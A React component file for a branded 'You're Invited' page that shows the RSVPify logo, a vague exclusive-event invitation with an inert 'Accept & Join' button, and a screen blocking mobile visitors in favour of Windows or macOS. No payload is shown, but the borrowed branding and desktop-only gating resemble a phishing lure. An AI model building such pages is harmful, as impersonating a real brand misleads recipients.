import React, { useState, useEffect } from 'react';
import './App.css';

export default function App() {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  if (isMobile) {
    return <MobileBlocker />;
  }

  return <Invite />;
}

function Invite() {
  return (
    <div className="wrapper">
      <div className="container">
        <div className="envelope-section">
          <div className="envelope">📬</div>
        </div>
        <div className="content-section">
          <div className="logo">
            <img
              src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
              alt="RSVPify"
            />
          </div>

          <h1>You're Invited</h1>
          <p className="subtitle">Experience something extraordinary</p>

          <div className="header-divider"></div>

          <p className="invite-text">
            We're thrilled to invite you to join us for an exclusive event.<br />
            <span className="highlight">Please accept this invitation and be part of something special.</span>
          </p>

          <button className="accept-btn">
            Accept & Join
          </button>
        </div>
      </div>
    </div>
  );
}

function MobileBlocker() {
  return (
    <div className="mobile-warning">
      <div className="mobile-content">
        <div className="mobile-logo">
          <img
            src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
            alt="RSVPify"
          />
        </div>

        <h1 className="mobile-title">Not Available on Mobile</h1>

        <p className="mobile-subtitle">
          This exclusive invitation is designed for desktop and laptop viewing only.
        </p>

        <div className="mobile-box">
          <p>
            ✓ Windows<br />
            ✓ macOS<br />
            ✗ Mobile Devices
          </p>
        </div>

        <p className="mobile-footer">
          Please visit this link from your desktop or laptop to continue.
        </p>
      </div>
    </div>
  );
}
